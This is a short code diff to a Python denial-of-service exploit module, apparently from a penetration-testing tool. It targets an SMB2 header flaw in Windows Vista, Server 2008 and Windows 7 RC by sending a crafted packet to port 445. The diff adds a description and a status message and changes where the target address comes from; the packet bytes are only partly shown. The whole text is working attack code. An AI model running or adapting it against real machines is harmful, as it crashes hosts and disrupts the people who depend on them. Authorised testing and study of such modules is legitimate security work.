@@ -11,11 +11,19 @@ class smb2_dos(DoS):
 
     def __init__(self):
         super(smb2_dos, self).__init__('SMB2 DoS')
+        self.info = """
+                    Exploits a vulnerability in an SMB header, causing a DoS 
+                    in the host.
+
+                    Windows Vista SP1/SP2, Server 2008/SP2, and Windows 7 RC
+                    are all affected.
+                    """
 
     def initialize(self):
         """ Initialize the DoS
         """
         try:
+            util.Msg("Sending payload...")
             pkt = (
                 "\x00\x00\x00\x90"
                 "\xff\x53\x4d\x42"
@@ -35,8 +43,7 @@ class smb2_dos(DoS):
 
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-            self.get_ip()
-            sock.connect((self.target, 445))
+            sock.connect((self.config['target']['value'], 445))
             sock.send(pkt)
             sock.close()
 
